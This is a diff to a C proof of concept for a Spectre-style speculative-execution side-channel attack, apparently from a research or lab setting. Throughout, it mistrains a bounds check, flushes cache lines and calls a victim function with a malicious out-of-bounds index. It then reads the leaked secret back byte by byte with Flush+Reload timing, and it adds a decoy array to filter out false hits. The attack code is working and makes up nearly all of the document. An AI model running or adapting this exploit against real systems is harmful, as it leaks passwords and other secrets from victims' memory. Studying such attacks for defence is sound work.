@@ -44,7 +44,7 @@ void set_heap_limit(size_t limit_bytes) {
 }
 
 char* secret_init(){
-    char* array = malloc(array_size);
+    char* array = malloc(8);
     if (array == NULL) {
         perror("Initial malloc failed");
         return NULL;
@@ -61,11 +61,25 @@ uint8_t* array_init(){
         return NULL;
     }
     memset(array, '-', array_size);
-    printf("Array addr: %p\n", array);
+    // printf("Array addr: %p\n", array);
     return array;
 }
 
+uint8_t* otherArray_init(uint32_t size, uint32_t malicious_index, char known_value){
+    uint8_t* array = malloc(size * sizeof(uint8_t));
+    if (array == NULL) {
+        perror("Initial malloc failed");
+        return NULL;
+    }
+    memset(array, '-', size);
+    array[malicious_index] = known_value;
+    // printf("Other Array addr: %p\n", array);
+    return array;
+}
 
+char random_char(){
+    return (char)(rand() % 93 + 33);
+}
 
 
 
@@ -186,15 +200,19 @@ void attacker_function() {
     printf("The malicious index is %p-%p=%#lx\n", secret, array_base,
            malicious_index);
     printf("-----------------------------------------\n");
+    array_base = &array[0];
+    // printf("attacker: array base addr: %p, secret addr: %p\n", array_base, secret);
+    //malicious_index = (uintptr_t)secret - (uintptr_t)array_base;
+    size_t safe_size = array_size-1; //New size but not too small to actually want to resize
+    size_t safe_index = array_size/2; //An in-bound index
+    size_t malicious_size = (size_t)(malicious_index+1);
+
+    uint8_t* otherArray = otherArray_init(malicious_size, malicious_index, 'Z');
+    char known_value = random_char();
+    // printf("Other Array addr: %p\n", otherArray);
 
     for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE; c++) {
         for (size_t r = 0; r < REP; r++) {
-            array_base = &array[0];
-            // printf("attacker: array base addr: %p, secret addr: %p\n", array_base, secret);
-            //malicious_index = (uintptr_t)secret - (uintptr_t)array_base;
-            size_t safe_size = array_size-1; //New size but not too small to actually want to resize
-            size_t safe_index = array_size/2; //An in-bound index
-            size_t malicious_size = (size_t)(malicious_index+1);
             for (size_t t = 0; t < TRAINING_EPOCH; t++) {
                 // We use an in-bound index for the first TRAINING_EPOCH - 1
                 // iterations and switch to the malicious index
@@ -209,15 +227,15 @@ void attacker_function() {
                 // startIndex, stride, N
                 flush_lines(pages, PAGE_SIZE, SYMBOL_CNT);
                 _mm_clflush((void *)&array_size);
+                if (is_attack) {
+                    free(otherArray);
+                }
                 // Ensure clflushes are finished
                 _mm_mfence();
                 _mm_lfence();
                 // Call the victim function and prevent compiler optimizations
                 _no_opt(victim_function(&array, pages, index, PAGE_SIZE, size));
             }
-            // Trick: array_init will reuse the old array location due to memory allocator's locality optimization
-            free(array);
-            array = array_init();
 
             for (size_t i = 0; i < SYMBOL_CNT; i++) {
                 // A clever hack to traverse [0, 255] in an unpredictable order
@@ -227,8 +245,17 @@ void attacker_function() {
                 // The "Reload" part of Flush+Reload
                 // Can be replaced with Prime+Probe
                 uint8_t *ptr = pages + PAGE_SIZE * idx;
-                hits[idx] += (_time_maccess(ptr) <= threshold);
+                if (idx != (uint8_t)known_value) {
+                    hits[idx] += (_time_maccess(ptr) <= threshold);
+                }
             }
+            // Trick: array_init will reuse the old array location due to memory allocator's locality optimization
+            // printf("Reallocated array pointer: %p\n", array);
+            free(array);
+            array = array_init();
+            known_value = random_char();
+            otherArray = otherArray_init(malicious_size, malicious_index, known_value);
+            // printf("Incorrect Other Access %c\n", otherArray[malicious_index]);
         }
 
         // Save the recovered character
